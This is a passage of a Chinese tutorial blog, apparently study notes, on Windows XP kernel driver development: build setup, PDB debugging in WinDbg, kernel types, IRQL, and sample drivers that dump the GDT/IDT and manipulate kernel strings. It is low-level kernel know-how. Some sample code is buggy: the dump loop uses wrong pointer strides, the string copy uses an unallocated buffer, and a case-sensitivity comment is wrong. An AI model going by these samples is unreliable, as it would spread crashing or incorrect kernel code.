class="name">EntryPointSymbol</span>&gt;</span>DriverEntry<span class="tag">&lt;/<span class="name">EntryPointSymbol</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">BaseAddress</span>&gt;</span>0x10000<span class="tag">&lt;/<span class="name">BaseAddress</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">RandomizedBaseAddress</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">RandomizedBaseAddress</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">DataExecutionPrevention</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">DataExecutionPrevention</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">GenerateDebugInformation</span>&gt;</span>true<span class="tag">&lt;/<span class="name">GenerateDebugInformation</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Driver</span>&gt;</span>Driver<span class="tag">&lt;/<span class="name">Driver</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ItemDefinitionGroup</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ItemGroup</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Project</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>替换内容：</p>
<ul>
<li><code>&lt;LibraryPath&gt;D:\WinDDK\7600.16385.1\lib\wxp\i386;$(LibraryPath)&lt;/LibraryPath&gt;</code>是设置目标平台的：将<code>D:\WinDDK</code>替换为本机WDK安装路径，替换为<code>C:\WinDDK</code>。</li>
<li><code>wxp</code>表示Windows XP系统。因为我们的学习平台就是XP，这里就不用改了。</li>
</ul>
</li>
<li><p>重启VS 2010。</p>
</li>
<li><p>左下角解决方案管理器-源代码-右键添加-新建项-Visual C++-C++文件-名称（.c文件）。</p>
</li>
<li><p>在新建的.c文件文件中添加如下驱动函数入口代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ntddk.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>F7调试生成，生成文件在<code>C:\Users\alvin\Documents\Visual Studio 2010\Projects\HelloDriver\Driver_1\HelloDriver.sys</code>。</p>
</li>
</ol>
<p>可以把鼠标放到类型上面去看属性，也可以使用F12进去查看。</p>
<h2 id="2-编译调试驱动程序"><a href="#2-编译调试驱动程序" class="headerlink" title="2 编译调试驱动程序"></a>2 编译调试驱动程序</h2><h3 id="2-1-驱动开发流程"><a href="#2-1-驱动开发流程" class="headerlink" title="2.1 驱动开发流程"></a>2.1 驱动开发流程</h3><p>驱动的开发流程：<br>编写代码 ----&gt;  生成.sys文件 ----&gt; 部署 ----&gt; 启动 ----&gt; 停止 ----&gt; 卸载。</p>
<h3 id="2-2-PDB文件"><a href="#2-2-PDB文件" class="headerlink" title="2.2 .PDB文件"></a>2.2 .PDB文件</h3><ol>
<li>PDB文件是在我们编译工程的时候产生的，它是和对应的模块（exe、dll或sys）一起生成出来的。</li>
<li>每个模块编译的时候都可以生成自己的PDB文件。比如.exe&#x2F;.dll&#x2F;.sys等等。</li>
</ol>
<p>PDB文件是编译驱动的同时生成的调试信息文件，它可以帮助我们像调试应用程序一样调试驱动程序。其实之前我们已经使用过PDB，我们配置双机调试环境时，在物理机上安装了符号文件，并在Windbg中导入过。</p>
<p>有了PDB，我们就可以知道当前汇编语句属于哪个函数，程序定义的结构体等关键信息，说一句题外话，软件发布的时候，切记不要把PDB也发布出去，因为这会给别人破解你的软件提供巨大便利。</p>
<h3 id="2-3-配置PDB路径"><a href="#2-3-配置PDB路径" class="headerlink" title="2.3 配置PDB路径"></a>2.3 配置PDB路径</h3><p>我们要调试一个驱动程序，就要将这个驱动程序的PDB文件的路径配置到Windbg的符号文件路径“Symbol FIle Path…”中，然后执行<code>.reload</code>。</p>
<p>步骤：</p>
<ol>
<li><p>在Win7下编译生成XP的驱动文件<code>sys</code>。</p>
</li>
<li><p>找到该sys一起发布的<code>.pdb</code>文件。</p>
</li>
<li><p>将所在目录路径复制到Windbg的符号文件路径下（记得加分号<code>;</code>），然后执行<code>.reload</code>。（C:\Users\alvin\Documents\Visual Studio 2010\Projects\20220112_01_FirstDriver\First_20220112）</p>
<p><img data-src="https://s2.loli.net/2022/01/13/ue7EyH2T1itpShm.png" alt="1.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/13/PCkgcLDrZoFJQ9a.png" alt="2.png"></p>
</li>
</ol>
<h2 id="3-调试程序"><a href="#3-调试程序" class="headerlink" title="3 调试程序"></a>3 调试程序</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载函数</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT driver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动程序停止运行了.\r\n&quot;</span>);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数，相当于main</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 下断点</span></span><br><span class="line">	__asm </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">		mov eax,eax</span><br><span class="line">		mov ecx,ecx</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 驱动程序入口</span></span><br><span class="line">	DbgPrint(<span class="string">&quot;A1v1n的第一个驱动程序.\r\n&quot;</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置一个卸载函数，便于退出</span></span><br><span class="line">	driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，触发断点了，观察windbg窗口：多了一个源代码窗口，现在可以像调试应用程序一样调试驱动了。</p>
<p><img data-src="https://s2.loli.net/2022/01/13/WbsRMgpAvhazuEO.png" alt="3.png"></p>
<h2 id="4-内核编程基础"><a href="#4-内核编程基础" class="headerlink" title="4 内核编程基础"></a>4 内核编程基础</h2><h3 id="4-1-内核API的使用"><a href="#4-1-内核API的使用" class="headerlink" title="4.1 内核API的使用"></a>4.1 内核API的使用</h3><p>在应用层编程我们可以使用WINDOWS提供的各种API函数，只要导入头文件<code>&lt;windows.h&gt;</code>就可以了，但是在内核编程的时候，我们不能像在Ring3那样直接使用。微软为内核程序提供了专用的API，只要在程序中包含相应的头文件就可以使用了，如：<code>#include &lt;ntddk.h&gt; </code>(假设你已经正确安装了WDK)。<br>2、 在应用层编程的时候，我们通过MSDN来了解函数的详细信息，在内核编程的时候，要使用WDK自己的帮助文档。</p>
<div class="note danger"><p>WDK查到的函数就一定在导出表里：</p>
<p><mark class="label success">文档化函数</mark>：函数在导出表里，有文档说明，有头文件。</p>
<p><mark class="label warning">未文档化函数</mark>：导出表里有，没有文档说明，没有头文件，定义<strong>函数指针</strong>去使用（<code>*pFN = GetProcessAddress(&quot;xyz&quot;)</code>）。</p>
<p><mark class="label primary">未导出函数</mark>：不在导出表，无文档说明，没有头文件，可以找到该函数的地址，然后使用<strong>函数指针</strong>去使用（<code>*pFN = 0x89765786</code>）。</p>
</div>

<h3 id="4-2-未导出函数的使用"><a href="#4-2-未导出函数的使用" class="headerlink" title="4.2 未导出函数的使用"></a>4.2 未导出函数的使用</h3><p>WDK说明文档中只包含了内核模块导出的函数，对于未导出的函数，则不能直接使用。</p>
<p>如果要使用未导出的函数，只要定义一个<strong>函数指针</strong>，并且为函数指针提供正确的函数地址就可以使用了。有两种办法都可以获取为导出的函数地址：</p>
<ol>
<li>特征码搜索。</li>
<li>解析内核PDB文件（使用<code>uf 函数名称</code>或<code>u 地址</code>）。</li>
</ol>
<h3 id="4-3-内核函数前缀"><a href="#4-3-内核函数前缀" class="headerlink" title="4.3 内核函数前缀"></a>4.3 内核函数前缀</h3><p>表2.3列出了一些常用的标识性前缀。（《Windows内核原理与实现》2.3.1）</p>
<p><img data-src="https://i.loli.net/2021/05/26/f6z1tYC8iWxBM4v.png" alt="12.png"></p>
<h3 id="4-4-内核基本数据类型"><a href="#4-4-内核基本数据类型" class="headerlink" title="4.4 内核基本数据类型"></a>4.4 内核基本数据类型</h3><p>WDK数据类型在<code>ntdef.h</code>中定义，下面列举部分，注意，<strong>并没有UINT</strong>。</p>
<p>在内核编程的时候，强烈建议大家遵守WDK的编码习惯，不要这样写：<code>unsigned long length;   </code>。</p>
<p>习惯使用WDK自己的类型（列举部分）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VOID void</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> CHAR;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">short</span> SHORT;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> LONG;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> UCHAR;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> USHORT;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> ULONG;</span><br><span class="line"><span class="keyword">typedef</span> QUAD UQUAD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">void</span> *PVOID;</span><br><span class="line"><span class="keyword">typedef</span> UCHAR *PUCHAR;</span><br><span class="line"><span class="keyword">typedef</span> USHORT *PUSHORT;</span><br><span class="line"><span class="keyword">typedef</span> ULONG *PULONG;</span><br><span class="line"><span class="keyword">typedef</span> UQUAD *PUQUAD;</span><br></pre></td></tr></table></figure>



<h3 id="4-5-NTSTATUS返回值"><a href="#4-5-NTSTATUS返回值" class="headerlink" title="4.5 NTSTATUS返回值"></a>4.5 NTSTATUS返回值</h3><p>4字节大小，类型定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> LONG NTSTATUS</span><br></pre></td></tr></table></figure>

<p>当你调用的内核函数，如果返回的结果不是STATUS_SUCCESS，就说明函数执行中遇到了问题，具体是什么问题，可以在<code>ntstatus.h</code>文件中查看。</p>
<p>大部分内核函数的返回值都是NTSTATUS类型，如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">PsCreateSystemThread</span><span class="params">()</span></span>;    </span><br><span class="line"><span class="function">NTSTATUS <span class="title">ZwOpenProcess</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">ZwOpenEvent</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p>这个值能说明函数执行的结果，比如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">STATUS_SUCCESS			<span class="number">0x00000000</span>	成功		</span><br><span class="line">STATUS_INVALID_PARAMETER	<span class="number">0xC000000D</span>	参数无效	</span><br><span class="line">STATUS_BUFFER_OVERFLOW		<span class="number">0x80000005</span>	缓冲区长度不够</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>NT_SUCCESS(<em>Status</em>)</li>
</ul>
<p> Evaluates to TRUE if the return value specified by <em>Status</em> is a  success type (0 − 0x3FFFFFFF) or an informational type (0x40000000 −  0x7FFFFFFF). </p>
<ul>
<li>NT_INFORMATION(<em>Status</em>)</li>
</ul>
<p> Evaluates to TRUE if the return value specified by <em>Status</em> is an  informational type (0x40000000 − 0x7FFFFFFF). </p>
<ul>
<li>NT_WARNING(<em>Status</em>)</li>
</ul>
<p> Evaluates to TRUE if the return value specified by <em>Status</em> is a  warning type (0x80000000 − 0xBFFFFFFF). </p>
<ul>
<li>NT_ERROR(<em>Status</em>)</li>
</ul>
<p> Evaluates to TRUE if the return value specified by <em>Status</em> is an error  type (0xC0000000 - 0xFFFFFFFF). </p>
</blockquote>
<h3 id="4-6-内核异常处理"><a href="#4-6-内核异常处理" class="headerlink" title="4.6 内核异常处理"></a>4.6 内核异常处理</h3><p>在内核中，一个小小的错误就可能导致蓝屏，比如：读写一个无效的内存地址。为了让自己的内核程序更加健壮，强烈建议大家在编写内核程序时，使用异常处。<br>Windows提供了结构化异常处理机制，一般的编译器都是支持的，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__try&#123;</span><br><span class="line">	<span class="comment">//可能出错的代码</span></span><br><span class="line">&#125;</span><br><span class="line">__except(filter_value) &#123;</span><br><span class="line">	<span class="comment">//出错时要执行的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>出现异常时，可根据<code>filter_value</code>的值来决定程序该如果执行，当<code>filter_value</code>的值为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">EXCEPTION_EXECUTE_HANDLER(<span class="number">1</span>)		代码进入except块</span><br><span class="line">EXCEPTION_CONTINUE_SEARCH(<span class="number">0</span>)		不处理异常，由上一层调用函数处理</span><br><span class="line">EXCEPTION_CONTINUE_EXECUTION(<span class="number">-1</span>)	回去继续执行错误处的代码</span><br></pre></td></tr></table></figure>



<h3 id="4-7-常用的内核内存函数"><a href="#4-7-常用的内核内存函数" class="headerlink" title="4.7 常用的内核内存函数"></a>4.7 常用的内核内存函数</h3><table>
<thead>
<tr>
<th align="center">C语言</th>
<th align="center">内核</th>
</tr>
</thead>
<tbody><tr>
<td align="center">malloc</td>
<td align="center">ExAllocatePool</td>
</tr>
<tr>
<td align="center">memset</td>
<td align="center">RtlFillMemory</td>
</tr>
<tr>
<td align="center">memcpy</td>
<td align="center">RtlMoveMemory</td>
</tr>
<tr>
<td align="center">free</td>
<td align="center">ExFreePool</td>
</tr>
</tbody></table>
<h3 id="4-8-内核字符串及常用字符串函数"><a href="#4-8-内核字符串及常用字符串函数" class="headerlink" title="4.8 内核字符串及常用字符串函数"></a>4.8 内核字符串及常用字符串函数</h3><p>为了提高安全性，内核中的字符串不再是字符串首地址指针作为开始，0作为结尾，而是采用了以下两个结构体：</p>
<p><strong>ANSI_STRING字符串：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STRING</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT Length;		<span class="comment">//字符串长度（单位：字节）</span></span><br><span class="line">    USHORT MaximumLength;	<span class="comment">//字符串最大长度</span></span><br><span class="line">    PCHAR Buffer;		<span class="comment">//字符串首地址</span></span><br><span class="line">&#125;STRING;</span><br></pre></td></tr></table></figure>

<p><strong>UNICODE_STRING字符串：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaxmumLength;</span><br><span class="line">    PWSTR Buffer;</span><br><span class="line">&#125; UNICODE_STRING;</span><br></pre></td></tr></table></figure>

<p>下面的表格列出了常用的字符串函数：</p>
<table>
<thead>
<tr>
<th>功能</th>
<th>ANSI_STRING字符串</th>
<th>UNICODE_STRING字符串</th>
</tr>
</thead>
<tbody><tr>
<td>创建</td>
<td>RtlInitAnsiString</td>
<td>RtlInitUnicodeString</td>
</tr>
<tr>
<td>复制</td>
<td>RtlCopyString</td>
<td>RtlCopyUnicodeString</td>
</tr>
<tr>
<td>比较</td>
<td>RtlCompareString</td>
<td>RtlCompareUnicoodeString</td>
</tr>
<tr>
<td>转换</td>
<td>RtlAnsiStringToUnicodeString</td>
<td>RtlUnicodeStringToAnsiString</td>
</tr>
</tbody></table>
<p>具体函数使用可参考：<a href="https://www.cnblogs.com/qintangtao/archive/2013/04/15/3023092.html">内核模式下的字符串操作</a></p>
<h3 id="4-9-中断请求级别IRQL"><a href="#4-9-中断请求级别IRQL" class="headerlink" title="4.9 中断请求级别IRQL"></a>4.9 中断请求级别IRQL</h3><p>尽管APIC（高级可编程中断控制器）中断控制器已经提供了中断优先级支持，不过，Windows自己还是定义了一套优先级方案，称为<strong>中断请求级别</strong>（IRQL，Interrupt Request Level）。在Intel x86系统中，Windows使用0~31来表示优先级，数值越大，优先级越高。</p>
<div class="note warning"><ol>
<li>Windowst运行在一个高并发的环境当中，<strong>任一时刻，每一个处理器，都运行在某个IRQL之上</strong>。</li>
<li>每个处理器的IRQL决定了它如何处理中断，以及允许接收哪些中断。<strong>优先级低的可以被优先级高的打断</strong>。</li>
<li>IRQL也被用于实现对一些内核模式数据结构的同步访问。例如，与线程调度相关的数据结构只有在<code>DISPATCH_LEVEL</code>上才可以访问。</li>
</ol>
</div>

<p>优先级如下图：</p>
<p><img data-src="https://s2.loli.net/2022/01/14/WSU957rkQIbi3wP.png" alt="4.png"></p>
<div class="note primary"><ol>
<li><mark class="label success">0，PASSIVE_LEVEL</mark>：<code>PASSIVE_LEVEL</code>（被动级别）代表了<strong>最低的IRQL</strong>，运行在<code>PASSIVE_LEVEL</code>的线程可以被任何高IRQL的事情打断，<strong>所有的用户模式代码都运行在此IRQL上</strong>。</li>
<li><mark class="label warning">1，APC_LEVEL</mark>：<code>APC_LEVEL</code>（APC级别）仅仅比<code>PASSIVE_LEVEL</code>高，这也正是在一个线程中插入一个APC可以打断该线程（如果它正在<code>PASSIVE_LEVEL</code>上）运行的原因。</li>
<li><mark class="label default">2，DISPATCH_LEVEL</mark>：该级别是一个重要的区分点，它代表了<strong>线程调度器正在运行</strong>。一个处理器运行在此IRQL上，说明它正在分配处理器的计算资源，有可能正在做两件事情之一：<ul>
<li>正在进行线程调度，比如选择新的线程。</li>
<li>正在处理一个硬件中断的后半部分（不那么紧急的部分），在Windows中，这被称为<strong>DPC</strong>（Deferred Procedure Call），DPC与线程无关。</li>
</ul>
</li>
<li><mark class="label info">3~26，设备IRQL（DIRQL）</mark>：3~26之间的RQL被分配给设备，称为<strong>设备IRQL</strong>（或<strong>DIRQL</strong>），HAL规定它们的分配方案。例如，在Intel x86多处理器系统中，HAL会循环地将中断向量号映射到这段IRQL范围中。从IRQL的角度而言，<strong>DIRQL范围中的IRQL并无优先级区别，不同的设备中断只是被映射到相同或不同的IRQL而已</strong>。</li>
</ol>
</div>

<p>关于APC_LEVEL：</p>
<p>在这个级别上，只有APC级别的中断被屏蔽，<strong>可以访问分页内存</strong>。当有APC发生时，处理器提升到APC级别，这样就屏蔽掉其它APC，为了和APC执行一些同步，驱动程序可以手动提升到这个级别。比如，如果提升到这个级别，APC就不能调用。在这个级别，APC被禁止了，导致禁止一些I0完成APC，所以有一些API不能调用。</p>
<p><strong>⚠️关于DISPATCH_LEVEL需要特别注意：</strong></p>
<ol>
<li><code>DISPATCH_LEVEL</code>是最高的软件中断IRQL，它低于所有硬件中断的IRQL。</li>
<li>运行在<code>DISPATCH_LEVEL</code>上的线程，<strong>不会被其他的线程抢占，只有可能被更高级别的中断抢占</strong>。</li>
<li>在<code>DISPATCH_LEVEL</code>或更高的IRQL上，<strong>不能访问换页内存区</strong>，因为一旦发生换页动作，就需要执行操作，从磁盘上读入页面，期间至少有一个等待动作。</li>
<li>除了系统调度器以外的其他内核代码，一旦运行在这个级别或更高的I迟IRQL上，则不得切换到其他线程（比如，等待一个同步对象），因为线程切换是通过系统调度器来完成的，而系统调度器运行在<code>DISPATCH_LEVEL</code>上。</li>
</ol>
<h3 id="4-a-练习1：读取GDT、IDT"><a href="#4-a-练习1：读取GDT、IDT" class="headerlink" title="4.a 练习1：读取GDT、IDT"></a>4.a 练习1：读取GDT、IDT</h3><p><strong>申请一块内存，并在内存中存储GDT、IDT的所有数据。然后在Debugview中显示出来，最后释放内存。</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntdef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载函数</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT driver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动程序停止运行了.\r\n&quot;</span>);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数，相当于main</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  UCHAR GDT[<span class="number">6</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  UCHAR IDT[<span class="number">6</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  ULONG GDTAddr = <span class="number">0</span>; ULONG IDTAddr = <span class="number">0</span>;</span><br><span class="line">  USHORT GDTLen = <span class="number">0</span>; USHORT IDTLen = <span class="number">0</span>;</span><br><span class="line">  PUCHAR pBuffer = <span class="literal">NULL</span>;</span><br><span class="line">  USHORT i = <span class="number">0</span>;</span><br><span class="line">  DbgPrint(<span class="string">&quot;主函数开始运行...\r\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 读取GDT、IDT寄存器的值</span></span><br><span class="line">	__asm </span><br><span class="line">	&#123;</span><br><span class="line">		sgdt fword ptr ds:[GDT];</span><br><span class="line">		sidt fword ptr ds:[IDT];</span><br><span class="line">	&#125;</span><br><span class="line">  GDTLen = *(PUSHORT)GDT;</span><br><span class="line">  IDTLen = *(PUSHORT)IDT;</span><br><span class="line">  GDTAddr = *(PULONG)(GDT+<span class="number">2</span>);</span><br><span class="line">  IDTAddr = *(PULONG)(IDT+<span class="number">2</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  PVOID </span></span><br><span class="line"><span class="comment">  ExAllocatePoolWithTag(</span></span><br><span class="line"><span class="comment">    IN POOL_TYPE  PoolType,</span></span><br><span class="line"><span class="comment">    IN SIZE_T  NumberOfBytes,</span></span><br><span class="line"><span class="comment">    IN ULONG  Tag</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="comment">//VirtualAlloc</span></span><br><span class="line">  pBuffer = (PUCHAR)ExAllocatePoolWithTag(PagedPool,GDTLen + IDTLen,<span class="number">20220114</span>);</span><br><span class="line">  <span class="keyword">if</span>(!pBuffer)</span><br><span class="line">  &#123;</span><br><span class="line">    DbgPrint(<span class="string">&quot;内存申请失败！\n&quot;</span>);</span><br><span class="line">    driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//memset</span></span><br><span class="line">  RtlFillMemory(pBuffer,GDTLen + IDTLen,<span class="number">0x0</span>);</span><br><span class="line">  <span class="comment">//memcpy</span></span><br><span class="line">  RtlMoveMemory(pBuffer,(PUCHAR)GDTAddr,GDTLen);</span><br><span class="line">  RtlMoveMemory(pBuffer+GDTLen,(PUCHAR)IDTAddr,IDTLen);</span><br><span class="line">  </span><br><span class="line">  DbgPrint(<span class="string">&quot;打印GDT\r\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; GDTLen;i+=<span class="number">16</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    DbgPrint(<span class="string">&quot;%08X %08X`%08X %08X`%08X\r\n&quot;</span>,GDTAddr+i,((PULONG)pBuffer+i)[<span class="number">1</span>],((PULONG)pBuffer+i)[<span class="number">0</span>],((PULONG)pBuffer+i)[<span class="number">3</span>],((PULONG)pBuffer+i)[<span class="number">2</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  DbgPrint(<span class="string">&quot;打印IDT\r\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//pBuffer = pBuffer + GDTLen;	//这行执行会蓝屏，不知道为什么</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; IDTLen;i+=<span class="number">16</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    DbgPrint(<span class="string">&quot;%08X %08X`%08X %08X`%08X\r\n&quot;</span>,IDTAddr+i,((PULONG)(pBuffer+GDTLen)+i)[<span class="number">1</span>],((PULONG)(pBuffer+GDTLen)+i)[<span class="number">0</span>],((PULONG)(pBuffer+GDTLen)+i)[<span class="number">3</span>],((PULONG)(pBuffer+GDTLen)+i)[<span class="number">2</span>]);</span><br><span class="line">  &#125;	</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//释放内存</span></span><br><span class="line">  ExFreePool(pBuffer);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 设置一个卸载函数，便于退出</span></span><br><span class="line">  driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">  <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/14/DJdGjS2IHmsBVLE.png" alt="5.png"></p>
<h3 id="4-b-练习2：处理字符串"><a href="#4-b-练习2：处理字符串" class="headerlink" title="4.b 练习2：处理字符串"></a>4.b 练习2：处理字符串</h3><p>&lt;1&gt; 初始化一个字符串</p>
<p>&lt;2&gt; 拷贝一个字符串</p>
<p>&lt;3&gt; 比较两个字符串是否相等</p>
<p>&lt;4&gt; ANSI_STRING与UNICODE_STRING字符串相互转换</p>
<p>结果：拷贝函数<code>RtlCopyString</code>无法成功执行拷贝，不知道为啥。</p>
<div class="note success"><p>⚠️注意：<strong>要是用变量的话需要在函数开头就进行定义，最好进行声明，不能是用变量的时候才进行定义，否则会失败</strong>。</p>
</div>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntdef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载函数</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT driver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动程序停止运行了.\r\n&quot;</span>);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数，相当于main</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  STRING StrSour = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  STRING StrDest = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  UNICODE_STRING UnicodeStr = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  UNICODE_STRING UnicodeStrDest = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  LONG lRet = <span class="number">0</span>;</span><br><span class="line">  NTSTATUS NtRet;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//初始化一个ANSI字符串</span></span><br><span class="line">  RtlInitAnsiString(&amp;StrSour,<span class="string">&quot;This is ANSI String!&quot;</span>);</span><br><span class="line">  DbgPrint(<span class="string">&quot;StrSour内容为：%s,长度为：%d，最大长度为：%d\n&quot;</span>,StrSour.Buffer,StrSour.Length,StrSour.MaximumLength);</span><br><span class="line">    </span><br><span class="line">  <span class="comment">//字符串拷贝</span></span><br><span class="line">  RtlCopyString(&amp;StrDest,&amp;StrSour);</span><br><span class="line">  DbgPrint(<span class="string">&quot;StrDest内容为：%s,长度为：%d，最大长度为：%d\n&quot;</span>,StrDest.Buffer,StrDest.Length,StrDest.MaximumLength);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">//比较两个字符串</span></span><br><span class="line">  lRet = RtlCompareString(&amp;StrDest,&amp;StrSour,TRUE);	<span class="comment">//TRUE:区分大小写</span></span><br><span class="line">  <span class="keyword">if</span>(lRet == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">	  DbgPrint(<span class="string">&quot;两个字符串一样！\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(lRet &gt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">	  DbgPrint(<span class="string">&quot;第一个字符串大于第二个字符串！\n&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">	  DbgPrint(<span class="string">&quot;第二个字符串大于第二个字符串！\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  